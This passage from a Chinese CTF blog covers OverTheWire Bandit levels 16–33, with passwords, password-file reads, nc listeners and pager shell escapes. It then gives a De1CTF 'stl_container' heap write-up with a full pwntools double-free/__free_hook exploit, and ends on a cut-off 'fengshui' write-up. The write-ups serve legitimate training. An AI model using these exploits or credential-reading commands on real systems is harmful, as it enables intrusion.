\\x20Please\\x20enter\\x20the\nSF:\\x20correct\\x20current\\x20password\\n\")%r(LDAPSearchReq,31,\"Wrong!\\x20Pl\nSF:ease\\x20enter\\x20the\\x20correct\\x20current\\x20password\\n\")%r(SIPOptions\nSF:,31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20current\\x20password\nSF:\\n\");\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 88.00 seconds\n------------------------------------------------------------------------\nbandit16@bandit:~$ mkdir /tmp/bling2/\nbandit16@bandit:~$ echo \"cluFn7wTiGryunymYOu4RcffSxQluehd\" | openssl s_client -connect localhost:31790 -quiet 2>/dev/null | tail -n 28 > /tmp/bling2/ssh.private\n-----------------------------------------------------------------------\nssh -i ssh.private bandit17@localhost\ncat /etc/bandit_pass/bandit17\n```\n\n\n\n(17)\n\nssh bandit17@bandit.labs.overthewire.org -p 2220\n\nxLYVMN9WE5zQ5vHacb0sZEVqbrp7nBTn\n\n```\nbandit17@bandit:~$ diff passwords.old passwords.new\n42c42\n< w0Yfolrc5bwjS4qw5mq1nnQi6mF03bii\n---\n> kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd\n```\n\n(18)\n\nssh bandit18@bandit.labs.overthewire.org -p 2220\n\nkfBf3eYk5BPBRzwjqutbbfE887SVc5Yd\n\n```\nbling@bling:~$ ssh bandit18@bandit.labs.overthewire.org -p 2220 \"cat readme\"\nThis is a OverTheWire game server. More information on http://www.overthewire.org/wargames\n\nbandit18@bandit.labs.overthewire.org's password: \nIueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x\n```\n\n(19)\n\nssh bandit19@bandit.labs.overthewire.org -p 2220\n\nIueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x\n\n```\nbandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/bandit20\nGbKksEFF4yrVs6il55v6gwY5aVje5f0j\n```\n\n(20)\n\nssh bandit20@bandit.labs.overthewire.org -p 2220\n\nGbKksEFF4yrVs6il55v6gwY5aVje5f0j\n\n```\n一个终端：\nbandit20@bandit:~$ nc -l -p 2333 < /etc/bandit_pass/bandit20\n\n另一个终端：\nbandit20@bandit:~$ ./suconnect 2333\nRead: GbKksEFF4yrVs6il55v6gwY5aVje5f0j\nPassword matches, sending next password\n\n第一个终端接收到如下字符串：\ngE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr\n```\n\n或者用一条命令完成\n\n```\nsh -c \"nc -l -p 2333 & < /etc/bandit_pass/bandit20\"; ./suconnect 2333\nor \nsh -c \"echo 'GbKksEFF4yrVs6il55v6gwY5aVje5f0j' | nc -l -p 2333 &\";./suconnect 8888\n```\n\n(21)\n\nssh bandit21@bandit.labs.overthewire.org -p 2220\n\ngE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr\n\n```shell\nbandit21@bandit:~$ cd /etc/cron.d/\n----------------------------------------------------------------------\nbandit21@bandit:/etc/cron.d$ cat cronjob_bandit22\n@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null\n* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null\n----------------------------------------------------------------------\nbandit21@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh\n#!/bin/bash\nchmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv\ncat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv\n----------------------------------------------------------------------\nbandit21@bandit:/etc/cron.d$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv\nYk7owGAcWjwMVRwrTesJEwB7WVOiILLI\n```\n\n(22)\n\nssh bandit22@bandit.labs.overthewire.org -p 2220\n\nYk7owGAcWjwMVRwrTesJEwB7WVOiILLI\n\n```shell\nbandit22@bandit:~$ cd /etc/cron.d\nbandit22@bandit:/etc/cron.d$ cat cronjob_bandit23\n@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null\n* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null\nbandit22@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit23.sh\n#!/bin/bash\n\nmyname=$(whoami)\nmytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)\n\necho \"Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget\"\n\ncat /etc/bandit_pass/$myname > /tmp/$mytarget\nbandit22@bandit:/etc/cron.d$ /usr/bin/cronjob_bandit23.sh\nCopying passwordfile /etc/bandit_pass/bandit22 to /tmp/8169b67bd894ddbb4412f91573b38db3\nbandit22@bandit:/etc/cron.d$ cat /tmp/8169b67bd894ddbb4412f91573b38db3\nYk7owGAcWjwMVRwrTesJEwB7WVOiILLI\n发现不对，于是采用如下方法：\nbandit22@bandit:/etc/cron.d$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1\n8ca319486bfbbc3663ea0fbe81326349\nbandit22@bandit:/etc/cron.d$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349\njc1udXuA1tiHqjIsL8yaapX5XIAI6i0n\n```\n\n(23)\n\nssh bandit23@bandit.labs.overthewire.org -p 2220\n\njc1udXuA1tiHqjIsL8yaapX5XIAI6i0n\n\n```shell\nbandit23@bandit:~$ cd /etc/cron.d\nbandit23@bandit:/etc/cron.d$ cat cronjob_bandit24\n@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null\n* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null\nbandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh\n#!/bin/bash\n\nmyname=$(whoami)\n\ncd /var/spool/$myname\necho \"Executing and deleting all scripts in /var/spool/$myname:\"\nfor i in * .*;\ndo\n    if [ \"$i\" != \".\" -a \"$i\" != \"..\" ];\n    then\n        echo \"Handling $i\"\n        owner=\"$(stat --format \"%U\" ./$i)\"\n        if [ \"${owner}\" = \"bandit23\" ]; then\n            timeout -s 9 60 ./$i\n        fi\n        rm -f ./$i\n    fi\ndone\n\n```\n\n```shell\nmkdir /tmp/bling3\nchmod 777 /tmp/bling3\ncd /tmp/bling3\nvim test.sh\n\t#!/bin/sh\n\tcat /etc/bandit_pass/bandit24 > /tmp/bling3/result24\nchmod 777 test.sh\ncp test.sh /var/spool/bandit24/test.sh\n等待一会儿\ncat result24\n```\n\n(24)\n\nssh bandit24@bandit.labs.overthewire.org -p 2220\n\nUoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ\n\n```shell\nbandit24@bandit:/tmp/bling4$ vim test.py\n--------------------\n\t#!/usr/bin/env python\n\tf = open('test.txt','w')\n\tfor i in range(10000):\n\t\tpayload = \"UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ\" + \" \" + str(i).zfill(4) + '\\n'\n\t\tf.write(payload)\n\tf.close()\n--------------------\nbandit24@bandit:/tmp/bling4$ python test.py\nbandit24@bandit:/tmp/bling4$ nc localhost 30002 < /tmp/bling4/test.txt > /tmp/bling4/result.txt\nbandit24@bandit:/tmp/bling4$ sort ./result.txt | uniq -u\n\nCorrect!\nExiting.\nI am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.\nThe password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG\n```\n\n(25)\n\nssh bandit25@bandit.labs.overthewire.org -p 2220\n\nuNG9O58gUE7snukf3bvZ0rxhtnjzSGzG\n\n```\n把窗口调整到只能显示3/4行的状态\n$ ssh -i bandit26.sshkey bandit26@localhost\n在more界面执行命令\nv - 进入编辑模式\nr /etc/bandit_pass/bandit26\n```\n\n(26)\n\nssh bandit26@bandit.labs.overthewire.org -p 2220\n\n5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z\n\n```\n把窗口调整到只能显示3/4行的状态\nssh登录上去，然后到more界面时，按v进入编辑模式，执行以下两条命令就可以获取shell\n:set shell=/bin/sh\n:shell\nbandit26@bandit:~$ ls\nbandit27-do  text.txt\nbandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27\n3ba3118a22e93127a4ed485be72ef5ea\n```\n\n(27)\n\nssh bandit27@bandit.labs.overthewire.org -p 2220\n\n3ba3118a22e93127a4ed485be72ef5ea\n\n```shell\nbandit27@bandit:~$ mkdir /tmp/bling\nbandit27@bandit:~$ cd /tmp/bling\nbandit27@bandit:/tmp/bling$ git clone ssh://bandit27-git@localhost/home/bandit27-git/repo\nCloning into 'repo'...\nCould not create directory '/home/bandit27/.ssh'.\nThe authenticity of host 'localhost (127.0.0.1)' can't be established.\nECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.\nAre you sure you want to continue connecting (yes/no)? yes\nFailed to add the host to the list of known hosts (/home/bandit27/.ssh/known_hosts).\nThis is a OverTheWire game server. More information on http://www.overthewire.org/wargames\n\nbandit27-git@localhost's password: \nremote: Counting objects: 3, done.\nremote: Compressing objects: 100% (2/2), done.\nremote: Total 3 (delta 0), reused 0 (delta 0)\nReceiving objects: 100% (3/3), done.\nbandit27@bandit:/tmp/bling$ ls\nrepo\nbandit27@bandit:/tmp/bling$ cd repo\nbandit27@bandit:/tmp/bling/repo$ ls\nREADME\nbandit27@bandit:/tmp/bling/repo$ cat README\nThe password to the next level is: 0ef186ac70e04ea33b4c1853d2526fa2\n\n```\n\n(28)\n\nssh bandit28@bandit.labs.overthewire.org -p 2220\n\n0ef186ac70e04ea33b4c1853d2526fa2\n\n```shell\n拉下repo后：\nbandit28@bandit:/tmp/bling28/repo$ git log\ncommit edd935d60906b33f0619605abd1689808ccdd5ee\nAuthor: Morla Porla <morla@overthewire.org>\nDate:   Thu May 7 20:14:49 2020 +0200\n\n    fix info leak\n\ncommit c086d11a00c0648d095d04c089786efef5e01264\nAuthor: Morla Porla <morla@overthewire.org>\nDate:   Thu May 7 20:14:49 2020 +0200\n\n    add missing data\n\ncommit de2ebe2d5fd1598cd547f4d56247e053be3fdc38\nAuthor: Ben Dover <noone@overthewire.org>\nDate:   Thu May 7 20:14:49 2020 +0200\n\n    initial commit of README.md\n\nbandit28@bandit:/tmp/bling28/repo$ git reset --hard c086d11a00c0648d095d04c089786efef5e01264\nHEAD is now at c086d11 add missing data\nbandit28@bandit:/tmp/bling28/repo$ cat README.md \n# Bandit Notes\nSome notes for level29 of bandit.\n\n## credentials\n\n- username: bandit29\n- password: bbc96594b4e001778eee9975372716b2\n```\n\n\n\n(29)\n\nssh bandit29@bandit.labs.overthewire.org -p 2220\n\nbbc96594b4e001778eee9975372716b2\n\n```shell\n拉下repo后：\nbandit29@bandit:/tmp/bling29/repo$ git branch -a\n* master\n  remotes/origin/HEAD -> origin/master\n  remotes/origin/dev\n  remotes/origin/master\n  remotes/origin/sploits-dev\nbandit29@bandit:/tmp/bling29/repo$ git checkout origin/dev\nPrevious HEAD position was 786d5be... add some silly exploit, just for shit and giggles\nHEAD is now at bc83328... add data needed for development\nbandit29@bandit:/tmp/bling29/repo$ cat README.md \n# Bandit Notes\nSome notes for bandit30 of bandit.\n\n## credentials\n\n- username: bandit30\n- password: 5b90576bedb2cc04c86a9e924ce42faf\n```\n\n(30)\n\nssh bandit30@bandit.labs.overthewire.org -p 2220\n\n5b90576bedb2cc04c86a9e924ce42faf\n\n```shell\nbandit30@bandit:/tmp/bling30/repo$ cd .git\nbandit30@bandit:/tmp/bling30/repo/.git$ cat *\ncat: branches: Is a directory\n[core]\n\trepositoryformatversion = 0\n\tfilemode = true\n\tbare = false\n\tlogallrefupdates = true\n[remote \"origin\"]\n\turl = ssh://bandit30-git@localhost/home/bandit30-git/repo\n\tfetch = +refs/heads/*:refs/remotes/origin/*\n[branch \"master\"]\n\tremote = origin\n\tmerge = refs/heads/master\nUnnamed repository; edit this file 'description' to name the repository.\nref: refs/heads/master\ncat: hooks: Is a directory\nDIRC\u0002\u0001^�3�\n�^�3�     e\n��\u0003\u0006$���+\u0016\u001e\u0002��!�L4 ]R\u0013?��֛��7w\tREADME.mdTREE\u00191 0\n��Y.�U�����36:F��JGVV\u0002F*-`-��I���}u/)Qcat: info: Is a directory\ncat: logs: Is a directory\ncat: objects: Is a directory\n# pack-refs with: peeled fully-peeled \n3aefa229469b7ba1cc08203e5d8fa299354c496b refs/remotes/origin/master\nf17132340e8ee6c159e0a4a6bc6f80e1da3b1aea refs/tags/secret\ncat: refs: Is a directory\nbandit30@bandit:/tmp/bling30/repo/.git$ ls -al\ntotal 52\ndrwxr-sr-x 8 bandit30 root 4096 May 17 14:52 .\ndrwxr-sr-x 3 bandit30 root 4096 May 17 14:52 ..\ndrwxr-sr-x 2 bandit30 root 4096 May 17 14:52 branches\n-rw-r--r-- 1 bandit30 root  276 May 17 14:52 config\n-rw-r--r-- 1 bandit30 root   73 May 17 14:52 description\n-rw-r--r-- 1 bandit30 root   23 May 17 14:52 HEAD\ndrwxr-sr-x 2 bandit30 root 4096 May 17 14:52 hooks\n-rw-r--r-- 1 bandit30 root  137 May 17 14:52 index\ndrwxr-sr-x 2 bandit30 root 4096 May 17 14:52 info\ndrwxr-sr-x 3 bandit30 root 4096 May 17 14:52 logs\ndrwxr-sr-x 4 bandit30 root 4096 May 17 14:52 objects\n-rw-r--r-- 1 bandit30 root  165 May 17 14:52 packed-refs\ndrwxr-sr-x 5 bandit30 root 4096 May 17 14:52 refs\nbandit30@bandit:/tmp/bling30/repo/.git$ git show --name-only secret\n47e603bb428404d265f59c42920d81e5\n```\n\n\n\n(31)\n\nssh bandit31@bandit.labs.overthewire.org -p 2220\n\n47e603bb428404d265f59c42920d81e5\n\n```shell\n将repo拉到本地后：\nbandit31@bandit:/tmp/bling31/repo$ ls -al\ntotal 20\ndrwxr-sr-x 3 bandit31 root 4096 May 17 15:00 .\ndrwxr-sr-x 3 bandit31 root 4096 May 17 14:59 ..\ndrwxr-sr-x 8 bandit31 root 4096 May 17 15:00 .git\n-rw-r--r-- 1 bandit31 root    6 May 17 15:00 .gitignore\n-rw-r--r-- 1 bandit31 root  147 May 17 15:00 README.md\nbandit31@bandit:/tmp/bling31/repo$ echo \"May I come in?\" > key.txt\nbandit31@bandit:/tmp/bling31/repo$ git add -f key.txt\nbandit31@bandit:/tmp/bling31/repo$ git status\nOn branch master\nYour branch is up-to-date with 'origin/master'.\nChanges to be committed:\n  (use \"git reset HEAD <file>...\" to unstage)\n\n\tnew file:   key.txt\n\nbandit31@bandit:/tmp/bling31/repo$ git commit -m \"add\"\n[master 93d69fa] add\n 1 file changed, 1 insertion(+)\n create mode 100644 key.txt\nbandit31@bandit:/tmp/bling31/repo$ git push origin master\nCould not create directory '/home/bandit31/.ssh'.\nThe authenticity of host 'localhost (127.0.0.1)' can't be established.\nECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.\nAre you sure you want to continue connecting (yes/no)? yes\nFailed to add the host to the list of known hosts (/home/bandit31/.ssh/known_hosts).\nThis is a OverTheWire game server. More information on http://www.overthewire.org/wargames\n\nbandit31-git@localhost's password: \nCounting objects: 3, done.\nDelta compression using up to 2 threads.\nCompressing objects: 100% (2/2), done.\nWriting objects: 100% (3/3), 315 bytes | 0 bytes/s, done.\nTotal 3 (delta 0), reused 0 (delta 0)\nremote: ### Attempting to validate files... ####\nremote: \nremote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.\nremote: \nremote: Well done! Here is the password for the next level:\nremote: 56a9bf19c63d650ce78e6ec0354ee45e\nremote: \nremote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.\nremote: \nTo ssh://localhost/home/bandit31-git/repo\n ! [remote rejected] master -> master (pre-receive hook declined)\nerror: failed to push some refs to 'ssh://bandit31-git@localhost/home/bandit31-git/repo'\n```\n\n(32)\n\nssh bandit32@bandit.labs.overthewire.org -p 2220\n\n56a9bf19c63d650ce78e6ec0354ee45e\n\n```shell\n>> $0\n$ ls\nuppershell\n$ cat /etc/bandit_pass/bandit33\nc9c3199ddf4121b10cf581a98d51caee\n```\n\n(33)\n\nssh bandit33@bandit.labs.overthewire.org -p 2220\n\nc9c3199ddf4121b10cf581a98d51caee\n\n```\n题目还没出来\n```\n\n# 3 参考\n\n[Linux 闯关游戏之通关秘籍](https://mp.weixin.qq.com/s/7N--mAlG2o4ixfpHyUAc_A)\n\n[Wargames](https://xuanxuanblingbling.github.io/ctf/game/2020/02/04/Wargames/)","tags":["game"],"categories":["基础技能"]},{"title":"De1CTF2020之stl_container","url":"/2020/05/03/stl-container/","content":"\n[stl_container](stl_container)\n[libc-2.27.so](libc-2.27.so)\n\n# 1 触发异常分支\n\n这个题目寻找漏洞点的过程比较曲折，IDA打开发现是c++代码，但是我真的不懂C++，纠结从代码里找漏洞找了一天也没思路。在男票的提醒下，直接触发漏洞，再根据触发的漏洞去理解程序然后利用。\n\nmain函数中可以看到四个stl函数。list和vector函数中实现了add,delete和show。queue和stack中只支持add和delete。\n\n```c\n \t  case 1u:\n        TestList();\n        break;\n      case 2u:\n        TestVector();\n        break;\n      case 3u:\n        TestQueue();\n        break;\n      case 4u:\n        TestStack();\n        break;\n```\n\n由于是堆相关的题目，很自然想到问题大多出在free时，因此对list和vector下的add和delete进行测试。在add两个vector，删除index为0的vector，然后执行show（0）时，打印了一堆无法显示的字符。\n\n```shell\nSTL Container Test\n1. list\n2. vector\n3. queue\n4. stack\n5. exit\n>> 2\n1. add\n2. delete\n3. show\n>> 1\ninput data:123\ndone!\nSTL Container Test\n……\n>> 2\n1. add\n2. delete\n3. show\n>> 1\ninput data:qwe\ndone!\nSTL Container Test\n……\n>> 2\n1. add\n2. delete\n3. show\n>> 2\nindex?\n0\ndone!\nSTL Container Test\n……\n>> 2\n1. add\n2. delete\n3. show\n>> 3\nindex?\n0\ndata: ���\u001f\u0014V\n```\n\ndata部分应该是访问了非法内存，那么接下来就用gef进行调试，看看是什么原因导致了访问非法内存。\n\n# 2 分析异常原因\n\n申请两个vector，然后查看chunk的分布情况：\n\n```shell\n~~~~~~\nChunk(addr=0x560ff5676490, size=0x20, flags=PREV_INUSE)\n    [0x0000560ff5676490     50 65 67 f5 0f 56 00 00 f0 65 67 f5 0f 56 00 00    Peg..V...eg..V..]\n~~~~~~\nChunk(addr=0x560ff5676550, size=0xa0, flags=PREV_INUSE)\n    [0x0000560ff5676550     76 65 63 74 6f 72 31 31 31 0a 00 00 00 00 00 00    vector111.......]\nChunk(addr=0x560ff56765f0, size=0xa0, flags=PREV_INUSE)\n    [0x0000560ff56765f0     76 65 63 74 6f 72 32 32 32 0a 00 00 00 00 00 00    vector222.......]\nChunk(addr=0x560ff5676690, size=0xe980, flags=PREV_INUSE)  ←  top chunk\n-----------------------------------------------------------------------------------\ngef➤  x/10gx 0x560ff5676490\n0x560ff5676490:\t0x0000560ff5676550\t0x0000560ff56765f0\n0x560ff56764a0:\t0x0000000000000000\t0x00000000000000a1\n```\n\n可以看到0x560ff5676490处依次存放了vector(0) 和vector(1)的字符串地址。接下来删除vector(0)，看看这个地址处和字符串有什么变化，如下。\n\n```shell\n~~~~~~~~\nChunk(addr=0x560ff5676490, size=0x20, flags=PREV_INUSE)\n    [0x0000560ff5676490     f0 65 67 f5 0f 56 00 00 f0 65 67 f5 0f 56 00 00    .eg..V...eg..V..]\n~~~~~~~~\nChunk(addr=0x560ff5676550, size=0xa0, flags=PREV_INUSE)\n    [0x0000560ff5676550     76 65 63 74 6f 72 31 31 31 0a 00 00 00 00 00 00    vector111.......]\nChunk(addr=0x560ff56765f0, size=0xa0, flags=PREV_INUSE)\n    [0x0000560ff56765f0     b0 64 67 f5 0f 56 00 00 32 0a 00 00 00 00 00 00    .dg..V..2.......]\n--------------------------------------------------------------------------------\ngef➤  x/10gx 0x560ff5676490\n0x560ff5676490:\t0x0000560ff56765f0\t0x0000560ff56765f0\n0x560ff56764a0:\t0x0000000000000000\t0x00000000000000a1\n```\n\n可以看到0x560ff5676490处，原本放vector(0)字符串地址的位置被vector(1)字符串地址`0x0000560ff56765f0`覆盖了，而且vector(1)字符串地址处的空间被释放了，vector(0)的字符串`“vector111”`依然在堆中。\n\n执行show(0)时，返回如下信息：\n\n```shell\n[DEBUG] Received 0x4f bytes:\n    00000000  64 61 74 61  3a 20 b0 64  67 f5 0f 56  0a 53 54 4c  │data│: ·d│g··V│·STL│\n    00000010  20 43 6f 6e  74 61 69 6e  65 72 20 54  65 73 74 0a  │ Con│tain│er T│est·│\n    00000020  31 2e 20 6c  69 73 74 0a  32 2e 20 76  65 63 74 6f  │1. l│ist·│2. v│ecto│\n    00000030  72 0a 33 2e  20 71 75 65  75 65 0a 34  2e 20 73 74  │r·3.│ que│ue·4│. st│\n    00000040  61 63 6b 0a  35 2e 20 65  78 69 74 0a  3e 3e 20     │ack·│5. e│xit·│>> │\n    0000004f\ndata: \\xb0dg�V\n```\n\n根据接收到的data可以看出，打印的是`b0 64  67 f5 0f 56`，这个正好对上了此时地址0x560ff56765f0处的内容。\n\n- 分析到这里，可以看出我们在delete 0号vector时，实际发生了这么一个过程：0号vector的字符串地址被从0x560ff5676490空间中删除，并且将1号vector的字符串地址前移一位；然后再free 0号vector的字符串地址，但此时该处已经变成 1号vector的字符串地址；因此导致删除 0号vector却free了 1号vector的字符串地址。而1号vector的字符串地址后续还可以继续被使用，这就是一个悬空指针。\n\n# 3 悬空指针可以做什么\n\n这个悬空指针目前有两种操作：\n\n- delete() - double free。由于这个题是ubuntu18.04下libc-2.27.so，有Tcache，因此一次double free就可以形成一个环，进而任意地址写。可以参考我之前做过的一个链接：https://blingblingxuanxuan.github.io/2020/03/13/TcacheTear/\n- show() - 泄露信息。如libc、堆栈、程序等地址或信息。\n\n## 3.1 泄露libc\n\n通常的做法是将一个chunk free到unsorted bin中，再将这个chunk申请回来，然后打印该chunk内容，就可以计算出libc的地址。\n\n这道题中我们无法控制申请的堆空间的大小，但是每add一个list/vector/queue/stack时，在Test::Init中都有malloc(0x98)，这些chunk在相应的delete操作后都会串到大小为0xa0的Tcache链上。一条Tcache链最多串7个chunk，第8个相同大小的chunk会被放到unsorted bin中。\n\n构造如下顺序的add和delete。最先delete list(1)时，大小为0xa0的Tcache链上会存在一个之前的chunk，此时我们只需delete 6个就可以将vector(0)放到unsorted bin中（实际是将vector(1)的data块扔到了unsorted bin），接下来通过show(vector 0)就可以读取到leak的地址，从而得到malloc_state结构体地址，最后查找libc-2.27.so中malloc_trim()中malloc_state的偏移，就可以计算出libc地址。\n\n```python\nvector_add(\"vector111\")\nvector_add(\"vector222\")\nlist_add(\"list111\")\nlist_add(\"list222\")\nqueue_add(\"queue111\")\nqueue_add(\"queue222\")\nstack_add(\"stack111\")\nstack_add(\"stack222\")\n\nlist_delete(1)\nlist_delete(0)\nqueue_delete()\nqueue_delete()\nstack_delete()\nstack_delete()\nvector_delete(0)\n\nvector_show(0)\nleak_addr = u64(myproc.recvuntil(\"\\n\")[:-1].ljust(8,\"\\x00\"))\nstate_addr = leak_addr - 0x60\nlibc_addr = state_addr - 0x3EBC40\nlog.warn(\"libc_addr: 0x%x\" % libc_addr)\n```\n\n## 3.2 写libc的函数指针\n\n由于本题got表不可写，且开启了PIE。因此考虑写libc中的函数指针，如`__malloc_hook`和`__free_hook`，将函数指针写成one gadget地址，下次调用到malloc或free时就能get shell。\n\n泄露完libc后，需要调整下堆空间的布局，通过double free获取一个环（在Tcache链上），从而去任意地址写。\n\n由于此时Tcache上0xa0链上是满的，因此需要add操作将Tcache链上的chunk用掉一些。我这里add了三次，其中一次必须是add vector(凑齐两个vector)，不然后续无法delete 两次形成double free。\n\n```\none_gadget1 = libc_addr + 0x4f322\nfree_hook_addr = libc_addr + 0x3ed8e8\n\nvector_add(\"vector333\")\nlist_add(\"list333\")\nlist_add(\"list444\")\nvector_delete(0)\nvector_delete(0)\n\nvector_add(p64(free_hook_addr))\nvector_add(p64(one_gadget1))\n```\n\n在libc-2.27.so中找到三个可用gadget，其中0x4f322可利用成功：\n\n```shell\nbling@Ubuntu1804:/mnt/hgfs/vmshare-1804$ one_gadget libc-2.27.so \n0x4f2c5 execve(\"/bin/sh\", rsp+0x40, environ)\nconstraints:\n  rsp & 0xf == 0\n  rcx == NULL\n\n0x4f322 execve(\"/bin/sh\", rsp+0x40, environ)\nconstraints:\n  [rsp+0x40] == NULL\n\n0x10a38c execve(\"/bin/sh\", rsp+0x70, environ)\nconstraints:\n  [rsp+0x70] == NULL\n```\n\n# 2 EXP\n\n```python\n#coding=utf-8\nfrom pwn import *\n\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\nmyelf = ELF(\"./stl_container\")\nmylibc = ELF(\"./libc-2.27.so\")\nmyproc = process(myelf.path)\n\ndef list_add(data):\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(1))\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(1))\n    myproc.recvuntil(\"input data:\")\n    myproc.sendline(data)\n\ndef list_delete(index):\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(1))\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(2))\n    myproc.recvuntil(\"index?\")\n    myproc.sendline(str(index))\n\ndef list_show(index):\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(1))\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(3))\n    myproc.recvuntil(\"index?\")\n    myproc.sendline(str(index))\n\ndef vector_add(data):\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(2))\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(1))\n    myproc.recvuntil(\"input data:\")\n    myproc.sendline(data)\n\ndef vector_delete(index):\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(2))\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(2))\n    myproc.recvuntil(\"index?\")\n    myproc.sendline(str(index))\n\ndef vector_show(index):\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(2))\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(3))\n    myproc.recvuntil(\"index?\")\n    myproc.sendline(str(index))\n\ndef queue_add(data):\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(3))\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(1))\n    myproc.recvuntil(\"input data:\")\n    myproc.sendline(data)\n\ndef queue_delete():\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(3))\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(2))\n\ndef stack_add(data):\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(4))\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(1))\n    myproc.recvuntil(\"input data:\")\n    myproc.sendline(data)\n\ndef stack_delete():\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(4))\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(2))\n\n###leak libc###\nvector_add(\"vector111\")\nvector_add(\"vector222\")\nlist_add(\"list111\")\nlist_add(\"list222\")\nqueue_add(\"queue111\")\nqueue_add(\"queue222\")\nstack_add(\"stack111\")\nstack_add(\"stack222\")\n\nlist_delete(1)\nlist_delete(0)\nqueue_delete()\nqueue_delete()\nstack_delete()\nstack_delete()\nvector_delete(0)\n\nvector_show(0)\nmyproc.recvuntil(\"data: \")\nleak_addr = u64(myproc.recvuntil(\"\\n\")[:-1].ljust(8,\"\\x00\"))\nlog.warn(\"leak_addr: 0x%x\" % leak_addr)\n\nstate_addr = leak_addr - 0x60\nlibc_addr = state_addr - 0x3EBC40\nlog.warn(\"libc_addr: 0x%x\" % libc_addr)\n\n### change libc hook###\none_gadget0 = libc_addr + 0x4f2c5\none_gadget1 = libc_addr + 0x4f322\none_gadget2 = libc_addr + 0x10a38c\nmalloc_hook_addr = libc_addr + 0x3ebc30\nfree_hook_addr = libc_addr + 0x3ed8e8\n#free_hook_addr = libc_addr + mylibc.symbols['__free_hook']\nlog.warn(\"malloc_hook_addr: 0x%x\" % malloc_hook_addr)\nlog.warn(\"free_hook_addr: 0x%x\" % free_hook_addr)\nlog.warn(\"one_gadget0: 0x%x\" % one_gadget0)\nlog.warn(\"one_gadget1: 0x%x\" % one_gadget1)\nlog.warn(\"one_gadget2: 0x%x\" % one_gadget2)\n\nvector_add(\"vector333\")\nlist_add(\"list333\")\nlist_add(\"list444\")\nvector_delete(0)\nvector_delete(0)\n\nvector_add(p64(free_hook_addr))\nvector_add(p64(one_gadget1))\n\n#gdb.attach(myproc)\nmyproc.interactive()\n```\n\n\n\n","categories":["CTF"]},{"title":"fengshui","url":"/2020/04/25/fengshui/","content":"\n- 题目文件：\n\n# 1 分析\n\n## 1.1 程序基本信息\n\n首先查看二进制文件信息：\n\n```shell\n$ file fengshui\nfengshui: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.24, BuildID[sha1]=45b09ec28a895f08b53682ead4e084874ee4b466, stripped\n$ checksec fengshui\n[*] '/mnt/hgfs/vmshare-1604/fengshui/ida/fengshui'\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x400000)\n```\n\n## 1.2 IDA源码分析\n\n程序有4个功能：添加person，删除person，修改person名字，打印person信息。\n\n### 1.2.1 添加person\n\n![](fengshui-1.png)\n\n\n\n### 1.2.2 删除person\n\n\n\n\n\n### 1.2.3 修改person名字\n\n\n\n\n\n### 1.2.4 打印person信息\n\n\n\n\n\n# 2 利用思路\n\n![](fengshui-2.png)\n\n\n\n![](fengshui-3.png)\n\n\n\n# 3 exp\n\n## 